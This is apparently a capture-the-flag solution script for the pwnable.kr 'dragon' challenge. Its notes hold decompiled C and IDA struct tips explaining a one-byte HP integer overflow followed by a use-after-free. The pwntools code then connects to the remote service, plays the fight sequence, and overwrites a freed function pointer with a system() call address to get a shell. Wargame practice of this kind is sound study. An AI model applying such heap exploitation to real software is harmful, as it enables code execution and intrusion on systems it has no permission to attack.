'''
Priest: 42 HP / 50MP
Knight: 50 HP / 0 Mana
Baby Dragon: 50 HP / 30 Damage / +5 Life Regeneration       # Too much damage, we need to call the mam dragon
Mama Dragon: 80 HP / 10 Damage / +4 Life Regeneration

void __cdecl FightDragon(int a1)
{
  ptr = malloc(0x10u);                                      # First malloc(0x10u)
  v5 = malloc(0x10u);
  ...
  v3 = xAttack((int)ptr, v5){
      ...
    if ( *(_DWORD *)(a1 + 4) <= 0 )
    {
      free(ptr);
      return 0;
    }
  }
  while ( *((_BYTE *)ptr + 8) > 0 );
  free(ptr);                                                # Free
  return 1;
  }

  if ( v3 )
  {
    puts("Well Done Hero! You Killed The Dragon!");
    puts("The World Will Remember You As:");
    v2 = malloc(0x10u);                                     # Malloc(0x10u) again at the same memory space
    __isoc99_scanf("%16s", v2);
    puts("And The Dragon You Have Defeated Was Called:");
    ((void (__cdecl *)(_DWORD *))*v5)(v5);                  # Use After Free
  }
  ...
}

.text:080487BD                 mov     byte ptr [eax+8], 50h            // 1-byte to store the HP, the max of it is 127

Use the integer overflow to let the HP of dragon to the number less than 0!
Then use UAF vuln.

*IDA Structure trick
View -> Open subviews -> Structures (Shift+F9)
`Insert` create new struct
`D` at the ends to create new field
`N` at the field_name to rename
`U` at the field_name to delete
`D` at the type to change type
`y` at the type of variable to reset the struct

00000000 player          struc ; (sizeof=0x4, mappedto_8)
00000000 flag            db ?
00000001 HP              db ?
00000002 MP              db ?
00000003 func            db ?
00000004 player          ends
00000004
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 dragon          struc ; (sizeof=0x6, mappedto_9)
00000000 func            db ?
00000001 flag            db ?
00000002 HP              db ?
00000003 heals           db ?
00000004 unknown         db ?
00000005 damages         db ?
00000006 dragon          ends



'''

from pwn import *

# binsh_argv = 0x804935c
# sys_addr = ELF("./dragon").symbols["system"]
call_sys = 0x8048dbf

p = remote("pwnable.kr", 9004)
p.recvuntil("Knight\n")
p.sendline('1')
p.recvuntil("Invincible.\n")
p.sendline('1')
p.recvuntil("Invincible.\n")
p.sendline('1')

# Now is the mama dragon
p.recvuntil("Knight\n")
p.sendline('1')
for i in xrange(4):
    p.recvuntil("Invincible.\n")
    p.sendline('3')
    p.recvuntil("Invincible.\n")
    p.sendline('3')
    p.recvuntil("Invincible.\n")
    p.sendline('2')

# Win! UAF exploit!
p.recvuntil("As:\n")
# payload = p32(sys_addr) + p32(binsh_argv)
payload = p32(call_sys) #+ p32(0x0 * 8)         # 0x10 - 0x8(call_sys) = 0x8
p.sendline(payload)
p.recv(timeout=5)
p.interactive()